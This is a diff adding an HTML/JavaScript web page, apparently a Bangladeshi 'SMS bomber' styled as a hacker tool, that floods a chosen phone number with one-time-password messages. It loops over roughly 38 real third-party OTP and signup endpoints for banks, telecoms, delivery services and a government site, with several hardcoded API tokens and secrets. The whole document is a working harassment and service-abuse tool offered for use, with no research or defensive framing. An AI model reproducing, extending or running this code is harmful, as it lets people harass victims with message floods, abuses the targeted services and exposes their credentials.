@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ANTOR VIP BOMBER</title>
+<style>
+body {
+    margin:0; background:#000; color:#ff0000;
+    font-family: 'Courier New', monospace; overflow:hidden; text-align:center;
+}
+canvas { position:fixed; top:0; left:0; z-index:-1; }
+.container {
+    width: 95%; max-width: 400px; margin: 30px auto;
+    position: relative; background: rgba(0, 0, 0, 0.9);
+    padding: 20px; border-radius: 15px; border: 2px solid #ff0000;
+    box-shadow: 0 0 30px rgba(255, 0, 0, 0.6);
+}
+.logo {
+    width: 110px; height: 110px; margin: auto;
+    border-radius: 50%; border: 3px solid #ff0000;
+    display: flex; align-items: center; justify-content: center;
+    box-shadow: 0 0 20px #ff0000; animation: pulse 1s infinite alternate;
+    overflow: hidden; /* ছবিটা যাতে গোল হয় */
+}
+.logo img {
+    width: 100%; height: 100%; object-fit: cover; /* ছবিটা ঠিকমতো ফিট করার জন্য */
+}
+@keyframes pulse { from { transform: scale(1); } to { transform: scale(1.05); } }
+
+.big-title { color: #ff0000; font-size: 20px; margin: 15px 0; font-weight: bold; text-shadow: 0 0 10px red; }
+input {
+    width: 100%; padding: 12px; margin: 6px 0;
+    background: #0a0a0a; border: 1px solid red; color: #0f0;
+    text-align: center; border-radius: 5px; box-sizing: border-box; font-size: 16px;
+}
+button {
+    width: 100%; padding: 15px; background: red; color: #fff;
+    border: none; cursor: pointer; font-weight: bold; margin-top: 10px;
+    box-shadow: 0 0 15px red; text-transform: uppercase;
+}
+.status { margin-top: 15px; display: flex; justify-content: space-around; font-size: 18px; font-weight: bold; }
+#log-box {
+    margin-top: 15px; font-size: 10px; color: #0f0; height: 100px;
+    overflow-y: hidden; text-align: left; background: rgba(0,0,0,0.8);
+    padding: 8px; border: 1px solid #333; border-radius: 5px;
+}
+</style>
+</head>
+<body>
+
+<canvas id="matrix"></canvas>
+
+<div class="container">
+    <div class="logo"><img src="https://i.ibb.co.com/F4pwqyTQ/1000017602.jpg" alt="ANTOR LOGO"></div>
+    <div class="big-title">☠️ ANTOR CYBER WARRIOR ☠️</div>
+
+    <input type="number" id="phone" placeholder="PHONE (017...)">
+    <input type="number" id="count" placeholder="BOMBING LIMIT">
+    <button onclick="startBombing()">EXECUTE ATTACK</button>
+
+    <div id="log-box">SYSTEM READY...</div>
+
+    <div class="status">
+        <div style="color:#0f0;">HIT: <span id="sCount">0</span></div>
+        <div style="color:#ff0000;">FAIL: <span id="fCount">0</span></div>
+    </div>
+</div>
+
+<script>
+async function startBombing() {
+    const phone = document.getElementById("phone").value;
+    const count = parseInt(document.getElementById("count").value);
+    const logBox = document.getElementById("log-box");
+    
+    if (phone.length < 11) { alert("Invalid Phone!"); return; }
+    
+    let s = 0, f = 0;
+    logBox.innerHTML = "ESTABLISHING API CONNECTIONS...";
+
+    const apiFuncs = [
+        // 1-26 (Original Stable APIs)
+        async (p) => fetch('https://cihno.aibl.com.bd/cihno-service/api/v1/public/user/send/otp', { method: 'POST', headers: {'Content-Type': 'application/json', 'authorization': 'Otp bnVsbA=='}, body: JSON.stringify({"countryId": "19", "mobileNumber": p, "purpose": "registration"}) }),
+        async (p) => fetch(`https://chinaonlineapi.com/api/v1/get/otp?phone=${p}`, { headers: {'token': 'gwkne73882b40gwgkef5150e91759f7a1282303230000000001utnhjglowjhmfl2585gfkiugmwp56092219'} }),
+        async (p) => fetch("https://prod-api.viewlift.com/identity/otp/resend?site=prothomalo", { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({"phoneNumber": "+88"+p}) }),
+        async (p) => fetch("https://api.deeptoplay.com/v1/auth/login?country=BD&platform=web", { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({number: p}) }),
+        async (p) => fetch("https://user-api.jslglobal.co:444/v1/send-otp", { method: 'POST', body: new URLSearchParams({phone: `+88${p}`, jatri_token: "J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"}) }),
+        async (p) => fetch("https://gw.jotno.net/auth/login/token", { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({username: p}) }),
+        async (p) => fetch('https://api.osudpotro.com/api/v1/users/send_otp', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({mobile: '+88-'+p, deviceToken: 'app', language: 'bn', os: 'android'}) }),
+        async (p) => fetch('https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({full_name: "Antor", phone_number: p}) }),
+        async (p) => fetch("https://developer.quizgiri.xyz/api/v2.0/send-otp", { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({country_code: "+880", phone: p}) }),
+        async (p) => fetch('https://api.shikho.com/auth/v2/send/sms', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({phone: p, type: 'student', auth_type: 'signup', vendor: 'shikho'}) }),
+        async (p) => fetch('https://api.toybox.live/bdapps_handler.php', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({"Operation": "CreateSubscription", "MobileNumber": "88"+p, "PackageID": 100, "Secret": "HJKX71%UHYH"}) }),
+        async (p) => fetch('https://api.betonbook.com/api/v5/auth/otp/request', { method: 'POST', headers: {"Content-Type": "application/json"}, body: JSON.stringify({phone: p, language: 1}) }),
+        async (p) => fetch('https://applink.com.bd/appstore-v4-server/login/otp/request', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({"msisdn": "88"+p}) }),
+        async (p) => fetch("https://webapi.robi.com.bd/v1/send-otp", { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({phone_number: p, type: 'my_offer'}) }),
+        async (p) => fetch("https://softmaxmanager.xyz/api/v1/user/request/otp/", { method: 'POST', body: new URLSearchParams({'phone_number': '+88'+p, 'app_signature': 'Fu89B%2BdY9dz'}) }),
+        async (p) => fetch("https://training.gov.bd/backoffice/api/user/sendOtp", { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({mobile: p}) }),
+        async (p) => fetch("https://us-central1-doctime-465c7.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber", { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({data: {code: '88', contact_no: p, country_calling_code: '88'}}) }),
+        async (p) => fetch("https://core.easy.com.bd/api/v1/registration", { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({"mobile": p, "password": "pass"}) }),
+        async (p) => fetch('https://eshop-api.banglalink.net/api/v1/customer/send-otp', { method: 'POST', headers: {"Content-Type": "application/json"}, body: JSON.stringify({type: "phone", phone: p}) }),
+        async (p) => fetch(`https://app.hishabee.business/api/V2/otp/send?mobile_number=${p}`, {method: 'POST'}),
+        async (p) => fetch(`https://www.skitto.com/replace-sim/sent-otp/${p}`),
+        async (p) => fetch("https://da-api.robi.com.bd/da-nll/otp/send", { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({msisdn: p}) }),
+        async (p) => fetch("https://api.chardike.com/api/otp/send", { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({phone: p, otp_type: "login"}) }),
+        async (p) => fetch('https://api.apex4u.com/api/auth/login', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({"phoneNumber": p}) }),
+        async (p) => fetch(`https://www.bioscopelive.com/en/login/send-otp?phone=88${p}`),
+        async (p) => fetch(`https://api.redx.com.bd/api/v1/user/signup?phone=${p}`),
+        
+        // 27-28 (Previous added)
+        async (p) => fetch('https://cokestudio23.sslwireless.com/api/store-and-send-otp', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({"msisdn":"88"+p,"name":"Antor","email":"antor@gmail.com"}) }),
+        async (p) => fetch('https://cokestudio23.sslwireless.com/api/check-gp-number', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({"msisdn":p}) }),
+
+        // 29-38 (Your New APIs)
+        async (p) => fetch('https://api.apex4u.com/api/auth/login', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({"phoneNumber": p}) }),
+        async (p) => fetch('https://applink.com.bd/appstore-v4-server/login/otp/request', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({"msisdn": "88"+p}) }),
+        async (p) => fetch('https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({number: p}) }),
+        async (p) => fetch('https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({number: p}) }),
+        async (p) => fetch('https://o1414573.ingest.sentry.io/api/6754888/envelope/?sentry_key=68ad6d0958034a43bad40e19baa32c07&sentry_version=7', { method: 'POST', body: p }),
+        async (p) => fetch('https://developer.quizgiri.xyz/api/v2.0/send-otp', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({country_code: "+880", phone: p}) }),
+        async (p) => fetch('https://api.shikho.com/auth/v2/send/sms', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({phone: p, type: 'student'}) }),
+        async (p) => fetch(`https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=${p}`, { method: 'GET' }),
+        async (p) => fetch(`https://api.redx.com.bd/v4/redx/does-user-exist?phoneNumber=${p}`, { method: 'GET' }),
+        async (p) => fetch('https://api.shikho.com/auth/v2/user/check', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({phone: p}) })
+    ];
+
+    for (let i = 0; i < count; i++) {
+        const currentApi = apiFuncs[i % apiFuncs.length];
+        let logLine = document.createElement("div");
+        logLine.innerText = `[+] [${i+1}] EXECUTING ATTACK...`;
+        logBox.prepend(logLine);
+
+        try {
+            await currentApi(phone);
+            s++;
+            document.getElementById("sCount").innerText = s;
+            logLine.style.color = "#0f0";
+            logLine.innerText += " SUCCESS ✔";
+        } catch (err) {
+            f++;
+            document.getElementById("fCount").innerText = f;
+            logLine.style.color = "red";
+            logLine.innerText += " FAILED ✘";
+        }
+        await new Promise(r => setTimeout(r, 200));
+    }
+}
+
+// Matrix Effect
+const canvas = document.getElementById('matrix');
+const ctx = canvas.getContext('2d');
+canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+const drops = [];
+for (let x = 0; x < canvas.width/15; x++) drops[x] = 1;
+
+function draw() {
+    ctx.fillStyle = "rgba(0, 0, 0, 0.1)";
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
+    ctx.font = "15px monospace";
+    for (let i = 0; i < drops.length; i++) {
+        const text = Math.random() > 0.8 ? "☠️" : "1";
+        ctx.fillStyle = text === "☠️" ? "red" : "#003300";
+        ctx.fillText(text, i * 15, drops[i] * 15);
+        if (drops[i] * 15 > canvas.height && Math.random() > 0.975) drops[i] = 0;
+        drops[i]++;
+    }
+}
+setInterval(draw, 50);
+</script>
+</body>
+</html>
